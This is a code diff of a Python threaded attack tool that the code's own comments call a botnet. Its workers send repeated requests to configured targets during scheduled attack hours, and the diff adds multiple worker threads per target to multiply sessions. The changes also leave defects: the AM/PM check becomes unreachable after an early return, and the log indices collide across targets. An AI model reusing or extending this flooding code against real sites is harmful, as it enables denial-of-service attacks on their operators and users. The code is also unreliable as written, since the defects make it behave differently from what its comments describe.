@@ -81,10 +81,7 @@ class AllSafeWorker(Thread):
         # check if there is any particolar attack time
         attackTime = map((lambda t: int(t)), self._action['attack_time'].split("-"))
         attackTime = list(attackTime)
-        if min(attackTime) <= utcnow.hour <= max(attackTime):
-             return True
-        else:
-             return False
+        return min(attackTime) <= utcnow.hour <= max(attackTime)
             
         # or check for AM / PM 
         if self._action['AM'] and self._action['PM']:
@@ -101,12 +98,13 @@ class AllSafeWorker(Thread):
         It check if it is possible to carry the attack, then start performing requests, carrying it on
         according to the configuration file.
         """
-        # check if the attack can be carried on
-        greenlight = self.carryAttack()
+        
+        # the botnet awaits until it can carry the attack at least once (aggressive behaviour)
+        while True:
 
-        # the botnet awaits until it can carry the attack at least once
-        # (aggressive behaviour)
-        while self._sessions > 0:
+            # check if the attack can be carried on
+            greenlight = self.carryAttack()
+
             if greenlight:
                 # performing the attack
                 for i in range(0, self._maxcount):
@@ -130,14 +128,10 @@ class AllSafeWorker(Thread):
 
                     # thread safe sleeping for the specified interval
                     threadSleep(self._period)
-
-                # decreasing session counter
-                self._sessions  -= 1
-                if self._sessions == 0: 
-                    break
+                
+                # exiting from while loop when attack has been carried max_count times (min. 1)
+                break
             
-            greenlight = self.carryAttack()
-
 
 class AllSafeWorkerMaster():
     def __init__(self, config_file, override=False):
@@ -175,12 +169,14 @@ class AllSafeWorkerMaster():
 
         for i in range(0, len(self._targets)):
             # iterating over the target list we initialize every worker
+            # (s workers for t targets)
             # and their log section 
-            self._workers_log[i] = []
-            worker = AllSafeWorker(i, "worker-" + str(i), self._targets[i], self._workers_log[i])
-            # logging worker reference
-            logInfo(self._log, worker.getWorkerTarget())
-            self._workers.append(worker)
+            for s in range(0, self._targets[i]['sessions']):
+                self._workers_log[i + s] = []
+                worker = AllSafeWorker(i, "worker-" + str(i) + "/" + str(s), self._targets[i], self._workers_log[i])
+                # logging worker reference
+                logInfo(self._log, worker.getWorkerTarget())
+                self._workers.append(worker)
 
         # logging the initialization routine - end
         logInfo(self._log, "------------------- </SETUP> -------------------")
@@ -201,7 +197,6 @@ class AllSafeWorkerMaster():
             worker.start()
 
         logInfo(self._log, "------------------- </STARTUP> -------------------")
-
         # iterating over worker to join them
         for worker_to_join in self._workers:
             worker_to_join.join()
